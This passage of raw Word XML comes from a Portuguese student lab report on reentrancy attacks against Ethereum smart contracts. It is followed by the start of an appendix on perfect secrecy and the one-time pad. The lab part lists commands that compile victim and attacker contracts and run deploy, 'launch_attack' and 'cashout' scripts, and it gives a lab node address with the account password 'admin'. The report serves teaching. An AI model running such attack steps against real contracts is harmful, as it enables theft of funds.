          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">solc-0.6.8 </w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="7D9029"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>--overwrite</w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="7D9029"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>--abi</w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="7D9029"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>--bin</w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="7D9029"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>-o</w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> . </w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>ReentrancyVictim.sol</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 xml:space="preserve">solc-0.6.8 </w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="7D9029"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>--overwrite</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--abi</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--bin</w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="7D9029"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>-o</w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> . ReentrancyAttacker.sol</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i/>
          <w:iCs/>
          <w:color w:val="60A0B0"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t># Deploy e testes</w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
      </w: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../victim</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deploy_victim_contract.py</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fund_victim_contract.py</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withdraw_from_victim_contract.py</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color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>cd</w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> ../attacker</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deploy_attack_contract.py</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launch_attack.py</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cashout.py</w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="60A0B0"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t># Verificações</w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>python3 get_balance.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18280BD3" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="172" w:name="_Toc213881969"/>
      <w:r>
        <w:t>9.2 Configuração de Rede</w:t>
      </w:r>
      <w:bookmarkEnd w:id="172"/>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="7920" w:type="dxa"/>
        <w:tblInd w:w="-108" w:type="dxa"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:val="0020" w:firstRow="1" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:noHBand="0" w:noVBand="0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3960"/>
        <w:gridCol w:w="3960"/>
      </w:tblGrid>
      <w:tr w:rsidR="00224B0C" w14:paraId="72206A57" w14:textId="77777777" w:rsidTr="00F86E6C">
        <w:trPr>
          <w:tblHeader/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3960" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="535A6A3B"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Componente</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3960" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4EAA30D6"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Detalhes</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00224B0C" w14:paraId="59E70553" w14:textId="77777777" w:rsidTr="00F86E6C">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3960" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="609C7B52"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Nó Ethereum</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3960" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6E33F265"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http://10.151.0.71:8545 (conforme cripto.txt)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00224B0C" w14:paraId="05F39361" w14:textId="77777777" w:rsidTr="00F86E6C">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3960" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0EC42C14"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Protocolo</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3960" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="16DBB676"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Proof-of-Authority (PoA)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00224B0C" w14:paraId="5E7310E5" w14:textId="77777777" w:rsidTr="00F86E6C">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3960" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6C69A0CA"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Interface Web</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3960" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2B4A5A33"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http://localhost:5000/ (EtherView)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00224B0C" w14:paraId="087D085A" w14:textId="77777777" w:rsidTr="00F86E6C">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3960" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7F5C0E22"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Senha das contas</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3960" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0997329B" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00F86E6C">
            <w:pPr>
              <w:pBdr>
                <w:top w:val="nil"/>
                <w:left w:val="nil"/>
                <w:bottom w:val="nil"/>
                <w:right w:val="nil"/>
                <w:between w:val="nil"/>
              </w:pBdr>
              <w:spacing w:before="36" w:after="36"/>
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
                <w:color w:val="000000"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>admin</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3FB62655" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Nota:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Os endereços específicos dos contratos deployados variam em cada execução e devem ser anotados durante o laboratório.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49E96937" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1A7630C2" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="4F81BD"/>
        </w:rPr>
        <w:t>10. Conclusão</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43394AC8" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="07F6BF5D" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
      <w:r>
        <w:t>Este laboratório proporcionou uma compreensão prática e profunda sobre ataques de reentrancy em smart contracts Ethereum.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20180B0F" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="556D01BC" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
      <w:r>
        <w:t>A experiência reforçou vários pontos críticos sobre segurança em blockchain</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51E8677B" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5BD6BFE2" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
      <w:r>
        <w:t>Primeiro, a importância da ordem de operações em smart contracts.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="588C3803" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> Segundo, o conceito de que smart contracts são imutáveis após o deploy. Uma vez que um contrato vulnerável está na blockchain, não existe forma de corrigi-lo. No contexto de blockchain, a única solução é fazer o deploy de um novo contrato e migrar os utilizadores, o que pode ser complexo e custoso.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="164DAF0C" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3D411EAD" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
      <w:r>
        <w:t>Terceiro, compreendemos que auditorias de segurança são absolutamente essenciais antes de colocar qualquer smart contract em produção. Estas técnicas são hoje consideradas melhores práticas na indústria e devem ser aplicadas consistentemente no desenvolvimento de smart contracts. Por fim, este laboratório destacou que a segurança em blockchain não é apenas uma questão técnica, mas também económica e social. O conhecimento sobre reentrancy attacks é fundamental para qualquer pessoa que trabalhe com smart contracts, seja como programador, auditor de segurança ou investigador.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04AE3844" w14:textId="28D30DA0" w:rsidR="00224B0C" w:rsidRPr="00224B0C" w:rsidRDefault="00224B0C">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
      <w:r w:rsidRPr="00224B0C">
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="43BE86D2" w14:textId="31F6D2A4" w:rsidR="004253CC" w:rsidRPr="00236B3B" w:rsidRDefault="00236B3B" w:rsidP="00236B3B">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
        <w:rPr>
          <w:rStyle w:val="nfaseDiscreta"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="173" w:name="_Toc213881970"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Avaliações Individuais</w:t>
      </w:r>
      <w:bookmarkEnd w:id="173"/>
    </w:p>
    <w:p w14:paraId="1B3D3C31" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00224B0C" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="173AEF08" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00224B0C" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
      </w:pPr>
      <w:r w:rsidRPr="00224B0C">
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00224B0C">
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AF0C778" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00224B0C" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
      </w:pPr>
      <w:r w:rsidRPr="00224B0C">
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12211DF7" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00224B0C" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2D8650A3" w14:textId="3E449690" w:rsidR="004253CC" w:rsidRPr="00224B0C" w:rsidRDefault="00000000" w:rsidP="00224B0C">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="00224B0C">
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00224B0C">
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00224B0C">
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00224B0C">
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00224B0C">
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00224B0C">
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00224B0C">
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00224B0C">
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00224B0C">
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00224B0C">
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00224B0C">
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="14D03F14" w14:textId="5B017C34" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="174" w:name="_Toc213874734"/>
      <w:bookmarkStart w:id="175" w:name="_Toc213881971"/>
      <w:r>
        <w:t xml:space="preserve">Apêndice A – </w:t>
      </w:r>
      <w:r w:rsidR="00236B3B">
        <w:t>Segredo Perfeito</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, Rodrigo Baltazar, </w:t>
      </w:r>
      <w:r w:rsidR="00236B3B">
        <w:t xml:space="preserve">nº </w:t>
      </w:r>
      <w:r>
        <w:t>2024142</w:t>
      </w:r>
      <w:bookmarkEnd w:id="174"/>
      <w:bookmarkEnd w:id="175"/>
    </w:p>
    <w:p w14:paraId="1410AF25" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pageBreakBefore/>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5F1BDFDA" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
      </w:pPr>
      <w:bookmarkStart w:id="176" w:name="_Toc213874735"/>
      <w:bookmarkStart w:id="177" w:name="_Toc213881972"/>
      <w:r>
        <w:t>Segredo Perfeito</w:t>
      </w:r>
      <w:bookmarkEnd w:id="176"/>
      <w:bookmarkEnd w:id="177"/>
    </w:p>
    <w:p w14:paraId="4B679DFD" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="6124CD0C" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Segredo Perfeito é um princípio definido pelo pai da era da informação e da criptografia moderna o matemático, Claude Shannon. Neste principio, Shannon afirma que uma mensagem cifrada só é considerada um segredo perfeito se ela não revelar nenhum tipo de informação do texto original. Isso significa que mesmo com um poder computacional infinito, é impossível decifrar a mensagem, pois a probabilidade de qualquer mensagem ser o texto original é a mesma, independente do texto cifrado.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BDB32E7" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t xml:space="preserve">Atualmente, nenhum protocolo de criptografia atende a este critério, pois todos os protocolos atuais dependem da suposição de que o poder computacional não tem capacidade de decifrar a mensagem criptografa a tempo de causar algum dano, por exemplo levar dezenas de anos para quebrar uma única cifra. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="033CB731" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Mas por sem um critério extremamente rigoroso, o segredo perfeito é atualmente possível em apenas uma única cifra, a One-Timed Pad (OTP). Nesta cifra, é gerada uma chave completamente aleatória de mesmo tamanho que o texto original, e então uma operação simples XOR é realizada. Para garantir que todos os critérios sejam cumpridos, a chave deve permanecer em segredo absoluto e só pode ser usada uma única vez.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B4C7C29" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Para exemplificar realizaremos uma operação simples na palavra “sim”.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="504414ED" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Na tabela abaixo, utilizarei a versão binária de cada caractere segundo o padrão ASCII, e combinaremos com uma chave, no caso 000. A escolha da chave deve ser aleatória, mas neste caso foi escolhida apenas para ilustrar um resultado possível em caracteres ASCII.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="8504" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="10" w:type="dxa"/>
          <w:right w:w="10" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="0000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:noHBand="0" w:noVBand="0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="982"/>
        <w:gridCol w:w="1347"/>
        <w:gridCol w:w="1332"/>
        <w:gridCol w:w="1068"/>
        <w:gridCol w:w="1358"/>
        <w:gridCol w:w="1261"/>
        <w:gridCol w:w="1156"/>
      </w:tblGrid>
      <w:tr w:rsidR="004253CC" w14:paraId="4666988E" w14:textId="77777777">
        <w:trPr>
          <w:tblHeader/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="982" w:type="dxa"/>
            <w:tcMar>
              <w:top w:w="15" w:type="dxa"/>
              <w:left w:w="15" w:type="dxa"/>
              <w:bottom w:w="15" w:type="dxa"/>
              <w:right w:w="15" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5EE3A562" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>posição</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1347" w:type="dxa"/>
            <w:tcMar>
              <w:top w:w="15" w:type="dxa"/>
              <w:left w:w="15" w:type="dxa"/>
              <w:bottom w:w="15" w:type="dxa"/>
              <w:right w:w="15" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5E4C7FE9" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>texto original (ASCII)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1332" w:type="dxa"/>
            <w:tcMar>
              <w:top w:w="15" w:type="dxa"/>
              <w:left w:w="15" w:type="dxa"/>
              <w:bottom w:w="15" w:type="dxa"/>
              <w:right w:w="15" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="37D3E948" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>binário do texto</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1068" w:type="dxa"/>
            <w:tcMar>
              <w:top w:w="15" w:type="dxa"/>
              <w:left w:w="15" w:type="dxa"/>
              <w:bottom w:w="15" w:type="dxa"/>
              <w:right w:w="15" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="57A94E9D" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
